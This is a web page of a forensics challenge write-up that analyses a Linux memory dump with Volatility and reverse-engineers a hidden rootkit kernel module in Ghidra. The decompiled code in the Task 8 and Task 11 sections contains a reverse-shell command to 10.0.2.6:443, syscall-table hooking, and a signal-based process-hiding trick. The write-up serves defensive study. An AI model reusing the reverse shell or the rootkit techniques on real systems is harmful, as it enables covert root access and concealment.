@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <title>APTnightmare-2 - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/sherlocks/APTnightmare-2.html" />
+    <!-- Sherlock-specific metadata for SEO -->
+    <meta name="description" content="Writeup for APTnightmare-2 sherlock - Hard difficulty level">
+    <meta name="keywords" content="Sherlock, APTnightmare-2, Hard, Blue Team, writeup, cybersecurity, threat hunting, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../sherlocks.html" class="logo">Sherlock writeups</a>
+            <div class="header-controls">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+                <div class="hamburger-menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <div class="difficulty-buttons">
+            <button class="difficulty-btn" data-difficulty="veasy">VEasy</button>
+            <div class="sherlock-list" id="veasy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
+            <div class="sherlock-list" id="easy-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
+            <div class="sherlock-list" id="medium-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
+            <div class="sherlock-list" id="hard-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+
+            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
+            <div class="sherlock-list" id="insane-sherlocks">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">APTnightmare-2</h1>
+        <div class="writeup-metadata">
+            <span class="difficulty hard">Hard</span>
+            <span class="date">October 9, 2025</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- Sherlock-specific content goes here -->
+                <p><img alt="solved" src="../images/APTNightmare-2/solved.png" /></p>
+<h1>Task 1</h1>
+<p>The challenge archive contains a memdump and a zipped "generic profile" of a Linux kernel version. </p>
+<p><img alt="unzip" src="../images/APTNightmare-2/unzip.png" /></p>
+<p>When trying to run certain volatility3 modules, a missing <code>symbol table</code> error would occur.</p>
+<p><img alt="error" src="../images/APTNightmare-2/error.png" /></p>
+<p>I need to generate a symbol table for this specific Linux kernel version, as without it, Volatility3 will have no idea how to interpret this memory dump, and certain commands will fail.</p>
+<h2>Generating a symbol table</h2>
+<p><img alt="map" src="../images/APTNightmare-2/map.png" /></p>
+<p>The archive contains a System.map file. This is a symbol table that contains a list of kernel symbol names (like functions and variables) and their corresponding memory addresses.</p>
+<p>I can use dwarf2json to create an Intermediate Symbol File(ISF) file in a JSON format, which will satisfy the symbol table requirement of volatility3.</p>
+<p><code>https://github.com/volatilityfoundation/dwarf2json</code></p>
+<p>I'll pass the system.map file as the argument for the --system-map flag.</p>
+<p><code>./dwarf2json-linux-amd64 linux --system-map APTNightmare-2/boot/System.map-5.3.0-70-generic &gt; symbols.json</code></p>
+<p>After moving this file to the appropriate symbols directory, I reran the pslist module, expecting it to work...</p>
+<p><img alt="error2" src="../images/APTNightmare-2/error2.png" /></p>
+<h2>Getting volatility2</h2>
+<p>I've never used volatility2 before, but I've heard that when something does not work with vol3 when expected, there is a pretty big chance that it might work with vol2.</p>
+<p>The necessary profile file was the .zip archive itself, and after moving it to the correct location <code>volatility/plugins/overlays/linux/</code>, I can check if it's recognized by running the --info command with volatility.</p>
+<p><img alt="profile" src="../images/APTNightmare-2/profile.png" /></p>
+<p>Afterwards, I can use the profile by providing the profile name string with the --profile= flag.</p>
+<p><code>python2 vol.py -f ../APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_pslist</code></p>
+<p><img alt="pslist" src="../images/APTNightmare-2/pslist.png" /></p>
+<hr />
+<p>Looking through the pstree output, I can see a suspicious string of events starting with bash(PID 3437), going through <code>sudo su</code>, and ending on another instance of bash(PID 3509), suggesting privilege escalation.</p>
+<p><img alt="suspicious" src="../images/APTNightmare-2/suspicious.png" /></p>
+<p>However, this does not give me the necessary details(IP:PORT) to formulate an answer to Q1. There is a module that focuses on this information, namely <code>linux_netscan</code>. It'll carve the memory image in search of any patterns resembling a network connection.</p>
+<p><code>python2 vol.py -f ../APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_netscan</code></p>
+<p><img alt="shell" src="../images/APTNightmare-2/shell.png" /></p>
+<p>In the output, I can see an established connection to <code>10.0.2.6</code> on port <code>443</code>. This IP:PORT string will be my answer to question 1.</p>
+<p><img alt="task1" src="../images/APTNightmare-2/task1.png" /></p>
+<h1>Task 2</h1>
+<p>I reran the pslist module to list all bash processes and their PPIDs.</p>
+<p><img alt="bash" src="../images/APTNightmare-2/bash.png" /></p>
+<p>The process string I previously deemed suspicious originates from the GNOME Terminal, which means that it was initiated by the user. Another legitimate bash process was initiated by the systemd service.</p>
+<p>There was one more bash process with a PPID of 1. This corresponds to the init process, which is the first user-level process started by the kernel during boot. Such a PPID could also mean an orphaned process(a process with no PPID, which gets "adopted" by init/systemd).</p>
+<p>Using the <code>psscan</code> module, I can see processes that have been hidden from the earlier scans.</p>
+<p><img alt="hidden" src="../images/APTNightmare-2/hidden.png" /></p>
+<p>This uncovers 3 new processes with PIDs of: 3627, 3632, and 3636. After checking them top to bottom, <code>3632</code> was revealed to be the answer.</p>
+<p><img alt="task2" src="../images/APTNightmare-2/task2.png" /></p>
+<h1>Task 3</h1>
+<p>The fact that there was a hidden process suggests the system may have been infected with a rootkit. To get a list of all kernel modules loaded during runtime, I'll run the <code>linux_lsmod</code> module. </p>
+<p><code>python2 vol.py -f ../APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_lsmod</code></p>
+<p><img alt="modules" src="../images/APTNightmare-2/modules.png" /></p>
+<p>I did not see anything suspicious in this list, but rootkits often "hide" themselves from view via various methods, like hijacking system calls and modifying them to avoid detection.</p>
+<p>That is where the <code>linux_hidden_modules</code> module shines. It carves the memory directly in search of hidden rootkits, so if anything was hiding from view, this would surely find it.</p>
+<p><img alt="malmod" src="../images/APTNightmare-2/malmod.png" /></p>
+<p>There was only one entry, which looks oddly familiar to one of the legitimate modules. The only difference is 2 characters with swapped places.</p>
+<p><code>nfentlink</code> will be my answer to question 3.</p>
+<p><img alt="task3" src="../images/APTNightmare-2/task3.png" /></p>
+<h1>Task 4</h1>
+<p>If volatility3 worked with this memdump, I'd just recover the host's filesystem with <code>pagecache.RecoverFs</code>. However, this won't work here, so I'll need a different approach.</p>
+<p>Looking through the module list of vol2, I found a module named <code>linux_dmesg</code>, which gathers and displays the dmesg buffer. This should contain the timestamp of when the rootkit was loaded.</p>
+<p><code>python2 vol.py -f ../APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_dmesg | grep nfentlink -C 5</code></p>
+<p><img alt="taint" src="../images/APTNightmare-2/taint.png" /></p>
+<p>The timestamp is there, but getting the answer will require a bit more work. Dmesg timestamps are in a <code>time since the system was booted</code> timestamp, showing it in a seconds.microseconds format.</p>
+<p>I then followed by getting the timestamp of the last message in the dmesg buffer, and the <code>modify</code> date of the memdump itself to calculate the proper UTC timestamp.</p>
+<p>Either I messed up the process somewhere, or some of the dmesg data was already lost at the point of the memdump being taken.</p>
+<h2>Finding an alternate way</h2>
+<p>Looking through the Vol2 modules again, I found a different module. Namely <code>linux_enumerate_files</code>, which will list files referenced by the filesystem cache.</p>
+<p><code>python2 vol.py -f ../APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_enumerate_files &gt; enum</code></p>
+<p>This can then be paired with <code>linux_find_file</code>, which will allow me to recover files by specifying the memory offset(here called an inode).</p>
+<p>The first file I'll recover will be the <code>syslog</code>, as it will contain the exact timestamp of when the malicious module was loaded(same message as in the dmesg output, but in a better format).</p>
+<p><img alt="syslog" src="../images/APTNightmare-2/syslog.png" /></p>
+<p>I'll use this memory offset to restore the syslog.</p>
+<p><code>python2 vol.py -f ../APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea5a730528  -O log2</code></p>
+<p><img alt="nfentlink" src="../images/APTNightmare-2/nfentlink.png" /></p>
+<p>Success! The only missing piece of this timestamp is the year, but from my failed manual conversion attempt, I can infer that the year was 2024.</p>
+<p>My full answer to question 4 will be <code>2024-05-02 20:42:57</code></p>
+<p><img alt="task4" src="../images/APTNightmare-2/task4.png" /></p>
+<h1>Task 5</h1>
+<p>Linux rootkits are most often found with the .ko(kernel object) file extension. I'll search the enum file for any file with such an extension, additionally grepping for the <code>nfnetlink</code> string.</p>
+<p><code>cat enum | grep \.ko | grep nfnetlink</code></p>
+<p><img alt="kmodules" src="../images/APTNightmare-2/kmodules.png" /></p>
+<p>Immediately, I can see 2 very suspicious things in this output:</p>
+<ul>
+<li>
+<ol>
+<li>All of the legitimate nfnetlink .ko files are located under <code>/lib/modules/5.3.0-70-generic/kernel/net/netfilter/</code>, while a single file stands out, being located under <code>/lib/modules/5.3.0-70-generic/kernel/drivers/net/</code></li>
+</ol>
+</li>
+<li>
+<ol>
+<li>All but one of the files have very close inode numbers. This indicates that they were created at the same time, whereas the file with a very different inode number was created much later, because the number is bigger.</li>
+</ol>
+</li>
+</ul>
+<p><code>/lib/modules/5.3.0-70-generic/kernel/drivers/net/nfnetlink.ko</code> will be my answer to question 5.</p>
+<h1>Task 6</h1>
+<p>In order to get the MD5 hash of the rootkit, I first have to recover it from the memdump. The necessary memory offset is already displayed in the output of the previous command.</p>
+<p><code>python2 vol.py -f ../APTNightmare-2/dump.mem --profile=LinuxUbuntu_5_3_0-70-generic_profilex64 linux_find_file -i 0xffff98ea266b5a68  -O nfnetlink.ko</code></p>
+<p>Now I can use <code>md5sum</code> to get an MD5 hash of the rootkit.</p>
+<p><img alt="md5sum" src="../images/APTNightmare-2/md5sum.png" /></p>
+<p><code>35bd8e64b021b862a0e650b13e0a57f7</code> will be my answer to question 6.</p>
+<p><img alt="task6" src="../images/APTNightmare-2/task6.png" /></p>
+<h1>Task 7</h1>
+<p>I ran strings against the rootkit, grepping for <code>author</code></p>
+<p><img alt="author" src="../images/APTNightmare-2/author.png" /></p>
+<p>After recovering the legitimate module and doing the same, the file appeared to contain no strings, despite having a non-zero size.</p>
+<p><img alt="fail" src="../images/APTNightmare-2/fail.png" /></p>
+<p>With this failure, I looked again at the email and found a discrepancy.</p>
+<p><code>&lt;laforge@netflter.org&gt;</code></p>
+<p>The first website that came up after I searched for more information about nfnetlink was <code>netfilter.org</code>. This email lacked an <code>i</code>, being identical to the true module otherwise.</p>
+<p><code>i</code> would be my answer to question 7.</p>
+<p><img alt="task7" src="../images/APTNightmare-2/task7.png" /></p>
+<h1>Task 8</h1>
+<p>After opening the rootkit in Ghidra, I filtered the symbol tree for the string <code>init</code></p>
+<p><img alt="symbols" src="../images/APTNightmare-2/symbols.png" /></p>
+<p>The <code>nfnetlink_init</code> is just a label, but the <code>init module</code> function holds a few interesting functionalities.</p>
+<pre class="codehilite"><code>undefined8 init_module(void)
+
+{
+  long in_GS_OFFSET;
+  undefined8 local_40;
+  char *local_38;
+  undefined *local_30;
+  char *local_28;
+  undefined8 local_20;
+  long local_18;
+
+  local_38 = &quot;/bin/bash&quot;;
+  local_30 = &amp;DAT_001008ba;
+  local_18 = *(long *)(in_GS_OFFSET + 0x28);
+  local_28 = &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.6/443 0&gt;&amp;1&quot;;
+  local_20 = 0;
+  call_usermodehelper(&quot;/bin/bash&quot;,&amp;local_38,0,1);
+  fh_install_hooks(hooks,3);
+  prev_module = _DAT_00100d90;
+  list_del.constprop.7();
+  __sys_call_table = kallsyms_lookup_name(&quot;sys_call_table&quot;);
+  orig_mkdir = *(undefined8 *)(__sys_call_table + 0x298);
+  local_40 = read_cr0();
+  clear_bit.constprop.9(&amp;local_40);
+  *(code **)(__sys_call_table + 0x298) = hook_mkdir;
+  local_40 = read_cr0();
+  set_bit.constprop.10(&amp;local_40);
+  if (local_18 != *(long *)(in_GS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+</code></pre>
+
+<p>By using the <code>call_usermodehelper</code> kernel function, the malware can launch reverse shells back to the attacker(running as root).</p>
+<p><code>list_del.constprop.7();</code> This is a kernel function that removes a module from the linked list of kernel modules. The rootkit essentially erased itself from the list, which is why it was not detected by the lsmod module of Volatility.</p>
+<p>Then, the rootkit creates a hook for its hook_mkdir function, which will make it execute instead of the intended use for the <code>mkdir</code> command.</p>
+<pre class="codehilite"><code>undefined8 hook_mkdir(long param_1)
+
+{
+  undefined8 uVar1;
+  long lVar2;
+  undefined8 *puVar3;
+  long in_GS_OFFSET;
+  undefined1 local_11f [7];
+  undefined8 auStack_118 [30];
+  undefined8 local_28;
+  long local_20;
+
+  uVar1 = *(undefined8 *)(param_1 + 0x70);
+  local_20 = *(long *)(in_GS_OFFSET + 0x28);
+  _local_11f = 0;
+  local_28 = 0;
+  puVar3 = (undefined8 *)(local_11f + 7);
+  for (lVar2 = 0x1f; lVar2 != 0; lVar2 = lVar2 + -1) {
+    *puVar3 = 0;
+    puVar3 = puVar3 + 1;
+  }
+  lVar2 = strncpy_from_user(local_11f,uVar1,0xff);
+  if (0 &lt; lVar2) {
+    printk(&amp;DAT_0010087c);
+  }
+  (*orig_mkdir)(param_1);
+  if (local_20 == *(long *)(in_GS_OFFSET + 0x28)) {
+    return 0;
+  }
+                    /* WARNING: Subroutine does not return */
+  __stack_chk_fail();
+}
+</code></pre>
+
+<p>It reads what directory was copied by the user, sends a formatted string to the kernel log buffer(viewable with dmesg), and ultimately calls the regular mkdir function to perform its normal task.</p>
+<hr />
+<p>With all that, the <code>init module</code> itself was not the answer to question 8. It was the other <code>init</code> string, <code>nfnetlink_init</code>.</p>
+<p><img alt="task9" src="../images/APTNightmare-2/task9.png" /></p>
+<h1>Task 10</h1>
+<p>In Ghidra, I searched for the <code>sys_call</code> string within the program text.</p>
+<p><img alt="table" src="../images/APTNightmare-2/table.png" /></p>
+<p>There are 3 syscalls listed. <code>__x64_sys getdents64</code>, <code>__x64_sys getdents</code>, and the last one, <code>__x64_sys_kill</code></p>
+<p><a href="syscalls.png">{syscalls</a></p>
+<h1>Task 11</h1>
+<p>I looked through the 3 hook functions and discovered the signal PID. First, I'll go over each of them briefly, starting with <code>hook_kill</code></p>
+<pre class="codehilite"><code>/* WARNING: Function: __fentry__ replaced with injection: fentry */
+/* WARNING: Function: __x86_indirect_thunk_rax replaced with injection: x86_indirect_thunk_rax */
+
+undefined8 hook_kill(long param_1)
+
+{
+  undefined8 uVar1;
+
+  if (*(int *)(param_1 + 0x68) != 0x40) {
+    uVar1 = (*orig_kill)();
+    return uVar1;
+  }
+  sprintf(&amp;hide_pid,&quot;%d&quot;,*(undefined8 *)(param_1 + 0x70));
+  return 0;
+</code></pre>
+
+<p>It takes in param_1 from the offset <code>0x68</code> (most definitely the signal number of a kill command), and compares it against a hardcoded value of 0x40(64).</p>
+<p>If the value is NOT 64, it calls the original kill function and operates normally.</p>
+<p>However, if the signal number is 64, it reads the PID from its offset in the arguments and saves that value into the <code>hide_PID</code> variable.</p>
+<hr />
+<p>The<code>hook getdents64</code> function then takes the hide_pid value, and removes the stored PID from command outputs like ps aux, so that the user does not see the process.</p>
+<p>This works by reading from the legitimate getdents(get directory entries) function, looking for the stored hide PID value, and removing it from the output. The rest is then returned untouched, but without the hidden PID.</p>
+<p>The signal number, which is used to hide PIDs, is <code>64</code></p>
+<p><img alt="task11" src="../images/APTNightmare-2/task11.png" /></p>
+<p>Solved!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <!-- Include the Markdown parser (not needed for static HTML) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Sherlock metadata for sidebar population
+        let sherlockData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch sherlock metadata
+                const response = await fetch('../sherlocks.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load sherlock metadata');
+                }
+                sherlockData = await response.json();
+                
+                // Populate the sidebar with sherlock links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with sherlock links dynamically
+        function populateSidebar() {
+            const categories = {
+                "veasy": document.getElementById("veasy-sherlocks"),
+                "easy": document.getElementById("easy-sherlocks"),
+                "medium": document.getElementById("medium-sherlocks"),
+                "hard": document.getElementById("hard-sherlocks"),
+                "insane": document.getElementById("insane-sherlocks")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add sherlock links to appropriate categories
+            for (const [sherlockName, data] of Object.entries(sherlockData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../sherlocks/${sherlockName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current sherlock
+                    if (data.title === "APTnightmare-2") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const sherlockList = document.querySelector(`#${difficulty}-sherlocks`);
+                    
+                    sherlockList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
